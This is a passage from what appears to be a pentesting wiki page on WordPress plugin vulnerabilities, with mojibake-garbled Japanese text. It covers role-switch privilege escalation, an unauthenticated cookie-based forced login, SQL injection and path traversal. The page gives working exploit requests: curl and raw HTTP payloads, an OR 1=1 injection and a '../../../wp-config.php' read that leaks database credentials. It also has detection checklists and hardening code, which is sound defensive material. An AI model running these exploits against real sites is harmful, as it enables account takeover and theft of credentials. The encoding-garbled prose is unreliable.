- å½“è©²æ©Ÿèƒ½ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã€‚
- å¯¾è±¡ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã€ä»¥å‰ã®ä½¿ç”¨ã‹ã‚‰ user meta ã«å¤ã„é«˜æ¨©é™ãƒ­ãƒ¼ãƒ«ã‚’ä¿æŒã—ã¦ã„ã‚‹ã€‚
- ä»»æ„ã®èªè¨¼æ¸ˆã¿ã‚»ãƒƒã‚·ãƒ§ãƒ³ï¼›ãƒªã‚»ãƒƒãƒˆãƒ•ãƒ­ãƒ¼ã« nonce/capability ãŒæ¬ å¦‚ã—ã¦ã„ã‚‹ã€‚

æ‚ªç”¨ï¼ˆä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
è„†å¼±ãªãƒ“ãƒ«ãƒ‰ã§ã¯ã€ã“ã‚Œã¯ç¾åœ¨ã®ãƒ­ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã€ä¿å­˜ã•ã‚Œã¦ã„ã‚‹å…ƒã®ãƒ­ãƒ¼ãƒ«ï¼ˆä¾‹ï¼š`administrator`ï¼‰ã‚’å†è¿½åŠ ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å®Ÿè³ªçš„ã«æ¨©é™ãŒæ˜‡æ ¼ã—ã¾ã™ã€‚

Detection checklist

- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¡ã‚¿ã«â€œå…ƒã®ãƒ­ãƒ¼ãƒ«â€ã‚’æ°¸ç¶šåŒ–ã™ã‚‹ãƒ­ãƒ¼ãƒ«åˆ‡æ›¿æ©Ÿèƒ½ã‚’æ¢ã™ï¼ˆä¾‹ï¼š`_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- ãƒªã‚»ãƒƒãƒˆ/å¾©å…ƒãƒ‘ã‚¹ã‚’ç‰¹å®šã™ã‚‹ï¼š
- ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ `$_REQUEST` / `$_GET` / `$_POST` ã‹ã‚‰èª­ã¿å–ã£ã¦ã„ã‚‹ã€‚
- `current_user_can()` ã¨ `wp_verify_nonce()` / `check_admin_referer()` ãªã—ã§ `add_role()` / `remove_role()` ã‚’ä»‹ã—ã¦ãƒ­ãƒ¼ãƒ«ã‚’å¤‰æ›´ã—ã¦ã„ã‚‹ã€‚
- ã‚¢ã‚¯ã‚¿ãƒ¼ã®æ¨©é™ã§ã¯ãªãã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³é…åˆ—ï¼ˆä¾‹ï¼š`viewing_admin_as_role_are`ï¼‰ã«åŸºã¥ã„ã¦èªå¯ã—ã¦ã„ã‚‹ã€‚

Hardening

- çŠ¶æ…‹ã‚’å¤‰æ›´ã™ã‚‹ã™ã¹ã¦ã®åˆ†å²ã§æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’å¼·åˆ¶ã™ã‚‹ï¼ˆä¾‹ï¼š`current_user_can('manage_options')` ã‚‚ã—ãã¯ã‚ˆã‚Šå³æ ¼ãªã‚‚ã®ï¼‰ã€‚
- ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«/æ¨©é™å¤‰æ›´ã«å¯¾ã—ã¦ nonce ã‚’è¦æ±‚ã—ã€æ¤œè¨¼ã™ã‚‹ï¼š`check_admin_referer()` / `wp_verify_nonce()`ã€‚
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§æ¸¡ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’æ±ºã—ã¦ä¿¡é ¼ã—ãªã„ã€‚èªè¨¼æ¸ˆã¿ã‚¢ã‚¯ã‚¿ãƒ¼ã¨æ˜ç¢ºãªãƒãƒªã‚·ãƒ¼ã«åŸºã¥ãã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚µãƒ¼ãƒãƒ¼å´ã§è§£æ±ºã™ã‚‹ã€‚
- ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ­ãƒ¼ãƒ«æ›´æ–°æ™‚ã«â€œå…ƒã®ãƒ­ãƒ¼ãƒ«â€ã®çŠ¶æ…‹ã‚’ç„¡åŠ¹åŒ–ã—ã€å¤ã„é«˜æ¨©é™ãŒå¾©å…ƒã•ã‚Œã‚‹ã®ã‚’é˜²ãï¼š
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- ä¸€æ™‚çš„ãªãƒ­ãƒ¼ãƒ«åˆ‡ã‚Šæ›¿ãˆã§ã¯ã€çŠ¶æ…‹ã‚’æœ€å°é™ã«æŠ‘ãˆã€æ™‚é–“åˆ¶é™ä»˜ãã§æ¨©é™ãƒã‚§ãƒƒã‚¯ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’æ¤œè¨ã—ã¦ãã ã•ã„ã€‚

---

### èªè¨¼ã•ã‚Œã¦ã„ãªã„ privilege escalation via cookieâ€‘trusted user switching on public `init` (Service Finder â€œsf-bookingâ€)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ user-switching ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’ public `init` ãƒ•ãƒƒã‚¯ã«çµã³ä»˜ã‘ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã® cookie ã‹ã‚‰è­˜åˆ¥ã‚’å°å‡ºã—ã¾ã™ã€‚ã‚‚ã—ã‚³ãƒ¼ãƒ‰ãŒèªè¨¼ã€capabilityã€ãŠã‚ˆã³æœ‰åŠ¹ãª nonce ã‚’æ¤œè¨¼ã›ãšã« `wp_set_auth_cookie()` ã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹ã¨ã€ä»»æ„ã®æœªèªè¨¼è¨ªå•è€…ãŒä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ ID ã¨ã—ã¦å¼·åˆ¶ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚

å…¸å‹çš„ãªè„†å¼±ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆService Finder Bookings â‰¤ 6.1 ã‹ã‚‰ç°¡ç•¥åŒ–ï¼‰ï¼š
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- å…¬é–‹ã•ã‚ŒãŸ `init` ãƒ•ãƒƒã‚¯ã«ã‚ˆã‚Šã€ãƒãƒ³ãƒ‰ãƒ©ãŒ unauthenticated users ã‹ã‚‰åˆ°é”å¯èƒ½ã«ãªã‚‹ï¼ˆ`is_user_logged_in()` ã‚¬ãƒ¼ãƒ‰ãŒãªã„ï¼‰ã€‚
- è­˜åˆ¥ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§å¤‰æ›´å¯èƒ½ãª cookie (`original_user_id`) ã‹ã‚‰æ´¾ç”Ÿã—ã¦ã„ã‚‹ã€‚
- ç›´æ¥ `wp_set_auth_cookie($uid)` ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ã€è¦æ±‚è€…ã‚’ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ãŒã€æ¨©é™ (capability) ã‚„ nonce ã®ãƒã‚§ãƒƒã‚¯ãŒè¡Œã‚ã‚Œãªã„ã€‚

æ‚ªç”¨ï¼ˆunauthenticatedï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Offensive notes

- ã‚¯ãƒªãƒ¼ãƒ³ãª payloads ã§ plugin å›ºæœ‰ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç‹™ã†: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ã¾ãš unauth ãƒ‘ã‚¹ã‚’è©¦ã™ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® payloads ã¯ã—ã°ã—ã°é›£èª­åŒ–ãªã—ã§æˆåŠŸã™ã‚‹ã€‚
- å…¸å‹çš„ãªé«˜å½±éŸ¿ã‚±ãƒ¼ã‚¹: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«æ±ç”¨ WAF ã‚·ã‚°ãƒãƒãƒ£ã«é ¼ã‚‰ãªã„ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¬ã‚¤ãƒ¤ãƒ¼ã§è„†å¼±æ€§å›ºæœ‰ã® virtual patches ã‚’å®Ÿè£…ã™ã‚‹ã‹ã€è¿…é€Ÿã«æ›´æ–°ã™ã‚‹ã€‚
- ã‚³ãƒ¼ãƒ‰å†…ã§ã¯ negative regex ãƒ•ã‚£ãƒ«ã‚¿ã‚ˆã‚Šã‚‚ã€positive-security ãƒã‚§ãƒƒã‚¯ï¼ˆcapabilitiesã€noncesã€å³æ ¼ãªå…¥åŠ›æ¤œè¨¼ï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **only install trustable WordPress plugins and themes**.

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ãã®ä»–ã®æ¨å¥¨äº‹é …**

- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® **admin** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹
- å¼·åŠ›ãª**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã¨**2FA**ã‚’ä½¿ç”¨ã™ã‚‹
- å®šæœŸçš„ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**æ¨©é™**ã‚’**è¦‹ç›´ã™**
- **ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œå›æ•°ã‚’åˆ¶é™**ã—ã¦ Brute Force æ”»æ’ƒã‚’é˜²ã
- **`wp-admin.php`** ãƒ•ã‚¡ã‚¤ãƒ«åã‚’å¤‰æ›´ã—ã€å†…éƒ¨ã¾ãŸã¯ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã€‚

### æ¤œè¨¼ä¸è¶³ã«ã‚ˆã‚‹æœªèªè¨¼ã® SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal ã® recruitment ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ **savecategory** ã‚¿ã‚¹ã‚¯ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€æœ€çµ‚çš„ã« `modules/category/model.php::validateFormData()` å†…ã§æ¬¡ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **æœªã‚µãƒ‹ã‚¿ã‚¤ã‚ºã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›** â€“ `parentid` ã¯ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ç›´æ¥å–å¾—ã•ã‚Œã¾ã™ã€‚
2. **WHEREå¥å†…ã§ã®æ–‡å­—åˆ—é€£çµ** â€“ `is_numeric()` / `esc_sql()` / prepared statement ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
3. **èªè¨¼ä¸è¦ã§åˆ°é”å¯èƒ½** â€“ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ `admin-post.php` çµŒç”±ã§å®Ÿè¡Œã•ã‚Œã¾ã™ãŒã€è¨­ã‘ã‚‰ã‚Œã¦ã„ã‚‹å”¯ä¸€ã®ãƒã‚§ãƒƒã‚¯ã¯ **CSRF nonce**ï¼ˆ`wp_verify_nonce()`ï¼‰ã§ã€ä»»æ„ã®è¨ªå•è€…ãŒã‚·ãƒ§ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ `[wpjobportal_my_resumes]` ã‚’åŸ‹ã‚è¾¼ã‚“ã å…¬é–‹ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

#### æ‚ªç”¨

1. æ–°ã—ã„ nonce ã‚’å–å¾—:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã® SQL ã‚’æ³¨å…¥:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯æ³¨å…¥ã—ãŸã‚¯ã‚¨ãƒªã®çµæœã‚’é–‹ç¤ºã™ã‚‹ã‹ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã€SQLi ã‚’å®Ÿè¨¼ã—ã¾ã™ã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

åˆ¥ã®ã‚¿ã‚¹ã‚¯ã€**downloadcustomfile** ã¯ã€è¨ªå•è€…ãŒ path traversal ã‚’æ‚ªç”¨ã—ã¦ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã® **ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã—ãŸã€‚è„†å¼±ãªã‚·ãƒ³ã‚¯ã¯ `modules/customfield/model.php::downloadCustomUploadedFile()` ã«ã‚ã‚Šã¾ã™:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ã¯æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã—ã¦ãŠã‚Šã€**ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œãšã«**é€£çµã•ã‚Œã¾ã™ã€‚å†åº¦ã€å”¯ä¸€ã®éšœå£ã¯ã€resume ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã‚‹**CSRF nonce**ã§ã™ã€‚

#### æ‚ªç”¨
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ã‚µãƒ¼ãƒãƒ¼ã¯ `wp-config.php` ã®å†…å®¹ã‚’è¿”ã—ã€leaking DB credentials and auth keys.

## å‚è€ƒè³‡æ–™

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
